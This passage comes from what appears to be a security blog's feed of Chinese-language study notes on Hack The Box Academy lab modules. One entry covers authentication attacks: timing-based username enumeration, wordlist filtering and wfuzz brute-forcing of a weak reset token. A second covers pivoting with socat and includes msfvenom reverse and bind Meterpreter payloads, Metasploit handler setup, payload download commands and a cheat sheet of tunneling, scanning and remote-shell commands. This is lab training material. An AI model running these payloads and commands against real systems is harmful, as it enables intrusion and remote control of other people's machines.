&quot;dbpass&quot;, &quot;dbname&quot;);// retrieve row data for user$result = $db-&gt;query(&#39;SELECT * FROM users WHERE username=&quot;&#39;.safesql($_POST[&#39;user&#39;]).&#39;&quot; AND active=1&#39;);// $db-&gt;query() replies True if there are at least a row (so a user), and False if there are no rows (so no users)if ($result) &#123;  // retrieve a row. don&#39;t use this code if multiple rows are expected  $row = mysqli_fetch_row($result);  // hash password using custom algorithm  $cpass = hash_password($_POST[&#39;password&#39;]);    // check if received password matches with one stored in the database  if ($cpass === $row[&#39;cpassword&#39;]) &#123;    echo &quot;Welcome $row[&#39;username&#39;]&quot;;  &#125; else &#123;    echo &quot;Invalid credentials.&quot;;  &#125; &#125; else &#123;  echo &quot;Invalid credentials.&quot;;&#125;?&gt;</code></pre><p>代码片段首先连接到数据库，然后执行查询以检索用户名与请求的用户名匹配的整行。如果没有结果，函数将以一条通用消息结束。当$result为true（用户存在并且处于活动状态）时，将对提供的密码进行散列和比较。如果使用的哈希算法足够强大，那么两个分支之间的时序差异将是显而易见的。通过使用通用hash_password（）函数计算$cpass，&#x3D;&#x3D;响应时间将高于其他情况&#x3D;&#x3D;。这个小错误可以通过在同一步骤中检查用户和密码来避免，有效用户名和无效用户名的时间相似。 下载脚本 <a href="https://academy.hackthebox.com/storage/modules/80/scripts/timing_py.txt">timing.py</a>来见证这些类型的时间差异，并针对使用bcrypt的示例web应用程序（timing.php）运行它。</p><h4 id="Timing-Attack-Timing-py"><a href="#Timing-Attack-Timing-py" class="headerlink" title="Timing Attack - Timing.py"></a>Timing Attack - Timing.py</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt</code></pre><p>考虑到可能存在网络故障，很容易将“admin”识别为有效用户，因为它比其他测试用户花费了更多的时间。如果使用的算法很快，则时差会更小，攻击者可能会因为网络延迟或CPU负载而产生误报。然而，通过重复大量创建模型的请求，攻击仍然是可能的。虽然我们可以假设现代应用程序使用稳健的算法对密码进行散列，以使潜在的离线暴力攻击尽可能慢，但即使使用MD5或SHA1等快速算法，也可以推断信息。 当领英的用户群在2012年被泄露时，InfoSec的专业人士就SHA1被用作用户密码的哈希算法展开了一场辩论。虽然SHA1在那些日子里没有崩溃，但它被认为是一个不安全的哈希解决方案。Infosec的专业人士开始争论是否选择使用SHA1，而不是更强大的哈希算法，如scrypt、bcrypt或PBKDF（或argon2）。 虽然使用更健壮的算法总是比使用较弱的算法更可取，但架构工程师也应该记住计算成本。这个非常基本的Python脚本有助于阐明这个问题：</p><pre><code class="python">import scryptimport bcryptimport datetimeimport hashlibrounds = 100salt = bcrypt.gensalt()t0 = datetime.datetime.now()for x in range(rounds):    scrypt.hash(str(x).encode(), salt)t1 = datetime.datetime.now()for x in range(rounds):    hashlib.sha1(str(x).encode())t2 = datetime.datetime.now()for x in range(rounds):    bcrypt.hashpw(str(x).encode(), salt)t3 = datetime.datetime.now()print(&quot;sha1:   &#123;&#125;\nscrypt: &#123;&#125;\nbcrypt: &#123;&#125;&quot;.format(t2-t1,t1-t0,t3-t2))</code></pre><p>使用更稳健的算法，这会增加CPU时间和RAM使用量。core第八代i5上运行上面的脚本会得到以下结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ python3 hashtime.pysha1:   0:00:00.000082scrypt: 0:00:03.907575bcrypt: 0:00:22.660548</code></pre><p>让我们通过一个粗略的例子来添加一些上下文： 领英每天有约2亿用户，这意味着每秒约有24次登录（我们不排除拥有“记住我”代币的用户）。 如果他们使用像bcrypt这样的强大算法，在我们的测试机器上每轮使用0.23秒，他们将需要六台服务器才能让人们登录。对于一家运行数千台服务器的公司来说，这听起来不是什么大问题，但这需要对架构进行彻底改革。</p><h2 id="Enumerate-through-Password-Reset"><a href="#Enumerate-through-Password-Reset" class="headerlink" title="Enumerate through Password Reset"></a>Enumerate through Password Reset</h2><p>重置表单的保护通常不如登录表单好。因此，他们经常泄露有关有效或无效用户名的信息。正如我们已经讨论过的，当找到有效的用户名时，应用程序会回复“您应该很快收到一条消息”，而“用户名未知，请检查您的数据”则会泄露注册用户的存在。 这种攻击很吵，因为一些有效用户可能会收到要求重置密码的电子邮件。也就是说，这些电子邮件经常得不到最终用户的适当关注。</p><h2 id="Enumerate-through-Registration-Form"><a href="#Enumerate-through-Registration-Form" class="headerlink" title="Enumerate through Registration Form"></a>Enumerate through Registration Form</h2><p>默认情况下，当所选用户名已经存在时，提示用户选择用户名的注册表单通常会回复一条明确的消息，或者在这种情况下提供其他“告诉”。通过滥用这种行为，攻击者可以注册常见的用户名，如admin、administrator、tech，以枚举有效的用户名。在检查所选用户名（如CAPTCHA）是否存在之前，安全注册表应该实现一些保护。 在测试时，许多人不知道或没有准备好电子邮件地址的一个有趣功能是子寻址。这个在RFC5233中定义的扩展表示，邮件传输代理（MTA）应该忽略电子邮件地址左侧的任何+标记，并将其用作筛选过滤器的标记。这意味着写信给学生这样的电子邮件地址<a href="mailto:&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;">&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;</a>将电子邮件发送到<a href="mailto:&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;">&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;</a>并且，如果支持并正确配置了过滤器，则会将其放置在文件夹htb中。很少有网络应用程序尊重这个RFC，这导致了通过使用一个标签和一个实际的电子邮件地址来注册几乎无限用户的可能性。</p><h2 id="Predictable-Usernames"><a href="#Predictable-Usernames" class="headerlink" title="Predictable Usernames"></a>Predictable Usernames</h2><p>在用户体验需求较少的网络应用程序中，例如家庭银行，或者需要批量创建多个用户时，我们可能会看到按顺序创建的用户名。 虽然不常见，但您可能会遇到像user1000、user1001这样的帐户。“管理”用户也可能有一个可预测的命名约定，如support.It、support.fr或类似的。攻击者可以推断用于创建用户的算法（增量四位数、国家代码等），并从一些已知的用户帐户开始猜测现有用户帐户。</p><h1 id="Brute-Forcing-Passwords"><a href="#Brute-Forcing-Passwords" class="headerlink" title="Brute Forcing Passwords"></a>Brute Forcing Passwords</h1><h2 id="Password-Issues"><a href="#Password-Issues" class="headerlink" title="Password Issues"></a>Password Issues</h2><p>从历史上看，密码有三个重要问题。第一个问题在于名称本身。很多时候，用户认为密码可以只是一个单词，而不是一个短语。第二个问题是，用户大多设置了易于记住的密码。这样的密码通常很弱，或者遵循可预测的模式。即使用户选择了一个更复杂的密码，它通常也会写在便利贴上或保存在明文中。在提示字段中写入密码的情况也并不少见。当访问企业网络的频繁密码轮换要求开始发挥作用时，第二个密码问题会变得更糟。这一要求通常会导致诸如Spring2020、Autumn2020或CompanynameTown1、CompanynameTown2等密码。 最近，美国国家标准与技术研究院更新了其关于密码策略测试、密码年龄要求和密码组成规则的指导方针。</p><p>最后，众所周知，许多用户在多个服务上重复使用相同的密码。其中一个密码泄露或泄露会让攻击者访问广泛的网站或应用程序。这种攻击被称为凭据填充，与Hashcat破解密码模块中教授的单词列表生成密切相关。存储和使用复杂密码的可行解决方案是密码管理器。有时您可能会遇到弱密码要求。这种情况通常发生在有额外安全措施的情况下。ATM就是一个很好的例子。密码，或者更好的是PIN，只是一个4或5位数字的序列。相当弱，但缺乏复杂性，但总尝试次数有限（在失去对设备的物理访问之前，不超过3个PIN）。</p><p>现在让我们假设这个web应用程序需要一个介于8到12个字符之间的字符串，其中至少有一个大写和小写字符。我们现在使用一个巨大的单词列表，只提取符合此策略的密码。Unix grep不是速度最快的工具，但它允许我们使用POSIX正则表达式快速完成这项工作。下面的命令将针对rockyou-50.txt，这是SecLists中常见的rockyou密码泄漏的子集。此命令使用扩展正则表达式（-E）查找至少有一个大写字符（“[：upper：]]”）的行，然后仅查找同时有一个小写字符（“[[：lower：]]’”）并且长度为8和12个字符（“^.｛8,12｝$”）的线。</p><pre><code class="shell-session">Tanin@htb[/htb]$ grep &#39;[[:upper:]]&#39; rockyou.txt | grep &#39;[[:lower:]]&#39; | grep -E &#39;^.&#123;8,12&#125;$&#39;</code></pre><h1 id="Predictable-Reset-Token"><a href="#Predictable-Reset-Token" class="headerlink" title="Predictable Reset Token"></a>Predictable Reset Token</h1><p>重置令牌（以代码或临时密码的形式）是主要由应用程序在请求重置密码时生成的秘密数据。在实际更改凭据之前，用户必须提供它来证明自己的身份。有时，应用程序要求您选择一个或多个安全问题，并在注册时提供答案。如果您忘记了密码，您可以通过再次回答这些问题来重置密码。我们也可以将这些答案视为象征。 此功能允许我们在不知道密码的情况下重置用户的实际密码。</p><h2 id="Reset-Token-by-Email"><a href="#Reset-Token-by-Email" class="headerlink" title="Reset Token by Email"></a>Reset Token by Email</h2><p>如果应用程序允许用户使用URL或通过电子邮件发送的临时密码重置密码，那么它应该包含强大的令牌生成功能。框架通常具有用于此目的的专用功能。然而，开发人员通常会实现自己的功能，这些功能可能会引入逻辑缺陷和弱加密，或者通过模糊实现安全性。</p><h2 id="Weak-Token-Generation"><a href="#Weak-Token-Generation" class="headerlink" title="Weak Token Generation"></a>Weak Token Generation</h2><p>一些应用程序使用已知或可预测的值（如本地时间或请求操作的用户名）创建令牌，然后对值进行散列或编码。这是一种糟糕的安全做法，因为令牌不需要包含来自要验证的实际用户的任何信息，并且应该是一个纯随机值。在可逆编码的情况下，对令牌进行解码以了解它是如何构建的并伪造一个有效的令牌就足够了。<br>作为渗透测试人员，我们应该意识到这些类型的糟糕实现。当为给定用户请求重置令牌时，我们应该尝试使用已知的组合（如时间+用户名或时间+电子邮件）来强制执行任何弱哈希。以这段PHP代码为例。它在逻辑上等同于Apache OpenMeeting上报告的CVE-2016-0783漏洞：</p><pre><code class="php">&lt;?phpfunction generate_reset_token($username) &#123;  $time = intval(microtime(true) * 1000);  $token = md5($username . $time);  return $token;&#125;</code></pre><p>很容易发现漏洞。知道有效用户名的攻击者可以通过读取Date标头（它几乎总是出现在HTTP响应中）来获取服务器时间。然后，攻击者可以在几秒钟内强行执行$time值，并获得有效的重置令牌。在这个例子中，我们可以看到一个常见的请求泄露日期和时间。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061018944.png" alt="img"></p><p>我们可以使用wfuzz。具体来说，我们可以为区分大小写的字符串Valid（–ss“Valid”）使用字符串匹配。当然，如果我们不知道提交有效令牌时web应用程序是如何回复的，我们可以使用“反向匹配”，通过使用–hs “Invalid.”查找不包含无效令牌的任何响应。</p><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -z range,00000-99999 --ss &quot;Valid&quot; &quot;https://brokenauthentication.hackthebox.eu/token.php?user=admin&amp;token=FUZZ&quot;</code></pre><p>&lt;待续…&gt;</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Overview-of-Attacks-Against-Authentication&quot;&gt;&lt;a href=&quot;#Overview-of-Attacks-Against-Authentication&quot; class=&quot;headerlink&quot; title=&quot;Overview of Attacks Against Authentication&quot;&gt;&lt;/a&gt;Overview of Attacks Against Authentication&lt;/h1&gt;&lt;p&gt;身份验证攻击总共可以针对三个域进行。这三个领域分为以下几类： &lt;strong&gt;HAS域（拥有的东西）&lt;/strong&gt; &lt;strong&gt;IS域（所知信息）&lt;/strong&gt; &lt;strong&gt;KNOWS域（所知的事情）&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp;Playing Pong with Socat</title>
    <link href="https://taninluv.github.io/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/"/>
    <id>https://taninluv.github.io/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/</id>
    <published>2023-08-30T02:43:05.000Z</published>
    <updated>2023-09-04T11:40:23.605Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Socat-Redirection-with-a-Reverse-Shell"><a href="#Socat-Redirection-with-a-Reverse-Shell" class="headerlink" title="Socat Redirection with a Reverse Shell"></a>Socat Redirection with a Reverse Shell</h1><p><a href="https://linux.die.net/man/1/socat">Socat</a>是一个双向中继工具，可以在2个独立的网络通道之间创建管道套接字，而无需使用SSH隧道。它充当了一个重定向器，可以监听一个主机和端口，并将数据转发到另一个IP地址和端口。我们可以使用上一节中提到的攻击主机上的相同命令启动Metasploit的侦听器，我们也可以在Ubuntu服务器上启动socat。</p><h4 id="Starting-Socat-Listener"><a href="#Starting-Socat-Listener" class="headerlink" title="Starting Socat Listener"></a>Starting Socat Listener</h4><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</code></pre><p>Socat将在8080端口的localhost上侦听，并将所有流量转发到我们的攻击主机（10.10.14.18）上的80端口。一旦配置了我们的重定向器，我们就可以创建一个有效负载，该负载将连接回在Ubuntu服务器上运行的重定向器。我们还将在攻击主机上启动一个侦听器，因为一旦socat接收到来自目标的连接，它就会将所有流量重定向到攻击主机的侦听器，在那里我们将获得一个shell。</p><h4 id="Creating-the-Windows-Payload"><a href="#Creating-the-Windows-Payload" class="headerlink" title="Creating the Windows Payload"></a>Creating the Windows Payload</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 80lport =&gt; 80msf6 exploit(multi/handler) &gt; run</code></pre><h1 id="Socat-Redirection-with-a-Bind-Shell"><a href="#Socat-Redirection-with-a-Bind-Shell" class="headerlink" title="Socat Redirection with a Bind Shell"></a>Socat Redirection with a Bind Shell</h1><p>类似于我们的socat的反向shell重定向器，我们也可以创建一个socat绑定shell重定向器。这与从Windows服务器连接回Ubuntu服务器并重定向到我们的攻击主机的反向shell不同。在绑定shell的情况下，Windows服务器将启动一个侦听器并绑定到一个特定的端口。我们可以为Windows创建一个绑定shell负载，并在Windows主机上执行它。同时，我们可以在Ubuntu服务器上创建一个socat重定向器，它将侦听来自Metasploit绑定处理程序的传入连接，并将其转发到Windows目标上的绑定shell负载。下图应该可以更好地解释枢轴。</p><p><img src="https://academy.hackthebox.com/storage/modules/158/55.png" alt="img"></p><p>我们可以通过以下命令使用msfvenom创建绑定shell。</p><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 499 bytesFinal size of exe file: 7168 bytesSaved as: backupjob.exe</code></pre><p>我们可以启动一个socat绑定shell侦听器，它在端口8080上侦听并将数据包转发到Windows服务器8443。</p><pre><code class="shell-session">ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</code></pre><p>最后，我们可以启动一个Metasploit绑定处理程序。这个绑定处理程序可以配置为连接到端口8080（Ubuntu服务器）上的socat侦听器</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcppayload =&gt; windows/x64/meterpreter/bind_tcpmsf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64RHOST =&gt; 10.129.202.64msf6 exploit(multi/handler) &gt; set LPORT 8080LPORT =&gt; 8080msf6 exploit(multi/handler) &gt; run[*] Started bind TCP handler against 10.129.202.64:8080</code></pre><p>我们可以看到，在Windows目标上执行有效负载时，绑定处理程序通过socat侦听器连接到阶段请求。</p><pre><code class="shell-session">[*] Sending stage (200262 bytes) to 10.129.202.64[*] Meterpreter session 1 opened (10.10.14.18:46253 -&gt; 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500meterpreter &gt; getuidServer username: INLANEFREIGHT\victor</code></pre><h1 id="socat基本用法："><a href="#socat基本用法：" class="headerlink" title="socat基本用法："></a>socat基本用法：</h1><p><code>socat</code> 是一个非常灵活的工具，可以用于许多不同的用途。以下是一些常见的 <code>socat</code> 命令示例，演示了一些常见的用法：</p><ol><li><p><strong>创建端口转发：</strong></p><pre><code>socat TCP-LISTEN:8080,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8080，并将流量转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>创建代理服务器：</strong></p><pre><code>socat TCP-LISTEN:8888,fork TCP:目标IP:80</code></pre><p>在本地监听端口 8888，将流量作为代理转发到目标 IP 地址的 80 端口。</p></li><li><p><strong>加密连接：</strong></p><pre><code>socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork OPENSSL:目标IP:8443</code></pre><p>在本地监听端口 443，使用 SSL 加密，将数据转发到目标 IP 地址的 8443 端口。</p></li><li><p><strong>创建虚拟串口：</strong></p><pre><code>socat PTY,link=/dev/ttyS0 PTY,link=/dev/ttyS1</code></pre><p>创建两个虚拟串口设备 <code>/dev/ttyS0</code> 和 <code>/dev/ttyS1</code>，将数据从一个串口转发到另一个串口。</p></li><li><p><strong>文件传输：</strong></p><pre><code>socat FILE:source.txt TCP-LISTEN:8080</code></pre><p>将文件 <code>source.txt</code> 的内容通过 TCP 在本地监听端口 8080 上传输。</p></li><li><p><strong>执行 Shell 命令：</strong></p><pre><code>socat SYSTEM:&#39;ls -l&#39;,pty,stderr TCP-LISTEN:8080</code></pre><p>在本地监听端口 8080，执行 <code>ls -l</code> 命令并将输出传输到连接。</p></li></ol><p>这些示例只是 <code>socat</code> 的一小部分用法，它有很多其他功能和选项，可以根据不同的需求进行调整。在使用 <code>socat</code> 时，应该查阅官方文档以了解更多详细信息和用法示例。</p><h1 id="本节备忘录："><a href="#本节备忘录：" class="headerlink" title="本节备忘录："></a>本节备忘录：</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>ifconfig</code></td><td>Linux-based command that displays all current network configurations of a system.</td></tr><tr><td><code>ipconfig</code></td><td>Windows-based command that displays all system network configurations.</td></tr><tr><td><code>netstat -r</code></td><td>Command used to display the routing table for all IPv4-based protocols.</td></tr><tr><td><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></td><td>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH comand used to create an SSH tunnel from a local machine on local port <code>1234</code> to a remote target using port 3306.</td></tr><tr><td>&#96;netstat -antp</td><td>grep 1234&#96;</td></tr><tr><td><code>nmap -v -sV -p1234 localhost</code></td><td>Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.</td></tr><tr><td><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command used to perform a dynamic port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</td></tr><tr><td><code>tail -4 /etc/proxychains.conf</code></td><td>Linux-based command used to display the last 4 lines of &#x2F;etc&#x2F;proxychains.conf. Can be used to ensure socks configurations are in place.</td></tr><tr><td><code>proxychains nmap -v -sn 172.16.5.1-200</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).</td></tr><tr><td><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).</td></tr><tr><td><code>proxychains msfconsole</code></td><td>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</td></tr><tr><td><code>msf6 &gt; search rdp_scanner</code></td><td>Metasploit search that attempts to find a module called <code>rdp_scanner</code>.</td></tr><tr><td><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></td><td>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td><td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</td></tr><tr><td><code>msf6 &gt; use exploit/multi/handler</code></td><td>Used to select the multi-handler exploit module in Metasploit.</td></tr><tr><td><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></td><td>Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user’s home directory (<code>:~/</code>).</td></tr><tr><td><code>python3 -m http.server 8123</code></td><td>Uses Python3 to start a simple HTTP server listening on port<code> 8123</code>. Can be used to retrieve files from a host.</td></tr><tr><td><code>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></td><td>PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.</td></tr><tr><td><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></td><td>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.</td></tr><tr><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td><td>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.</td></tr><tr><td><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td><td>Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</td></tr><tr><td></td><td></td></tr><tr><td>&#96;for i in {1..254} ;do (ping -c 1 172.16.5.$i</td><td>grep “bytes from” &amp;) ;done&#96;</td></tr><tr><td>&#96;for &#x2F;L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100</td><td>find “Reply”&#96;</td></tr><tr><td>&#96;1..254</td><td>% {“172.16.5.$($<em>): $(Test-Connection -count 1 -comp 172.15.5.$($</em>) -quiet)”}&#96;</td></tr><tr><td><code>msf6 &gt; use auxiliary/server/socks_proxy</code></td><td>Metasploit command that selects the <code>socks_proxy</code> auxiliary module.</td></tr><tr><td><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></td><td>Metasploit command that lists all currently running jobs.</td></tr><tr><td><code>socks4 127.0.0.1 9050</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>Socks5 127.0.0.1 1080</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>msf6 &gt; use post/multi/manage/autoroute</code></td><td>Metasploit command used to select the autoroute module.</td></tr><tr><td></td><td></td></tr><tr><td><code>meterpreter &gt; help portfwd</code></td><td>Meterpreter command used to display the features of the portfwd command.</td></tr><tr><td><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</td></tr><tr><td><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td><td>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</td></tr><tr><td><code>netstat -antp</code></td><td>Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.</td></tr><tr><td><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.</td></tr><tr><td><code>meterpreter &gt; bg</code></td><td>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</td></tr><tr><td><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>Windows-based command that uses PuTTY’s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</td></tr><tr><td><code>sudo apt-get install sshuttle</code></td><td>Uses apt-get to install the tool sshuttle.</td></tr><tr><td><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td><td>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).</td></tr><tr><td><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td><td>Clones the rpivot project GitHub repository.</td></tr><tr><td><code>sudo apt-get install python2.7</code></td><td>Uses apt-get to install python2.7.</td></tr><tr><td><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td><td>Used to run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).</td></tr><tr><td><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></td><td>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</td></tr><tr><td><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td><td>Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.</td></tr><tr><td><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></td><td>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</td></tr><tr><td><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></td><td>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</td></tr><tr><td><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td><td>Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</td></tr><tr><td><code>netsh.exe interface portproxy show v4tov4</code></td><td>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</td></tr><tr><td><code>git clone https://github.com/iagox86/dnscat2.git</code></td><td>Clones the <code>dnscat2</code> project GitHub repository.</td></tr><tr><td><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td><td>Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>inlanefreight.local</code> with the no-cache option enabled.</td></tr><tr><td><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td><td>Clones the dnscat2-powershell project Github repository.</td></tr><tr><td><code>Import-Module dnscat2.ps1</code></td><td>PowerShell command used to import the dnscat2.ps1 tool.</td></tr><tr><td><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td><td>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec 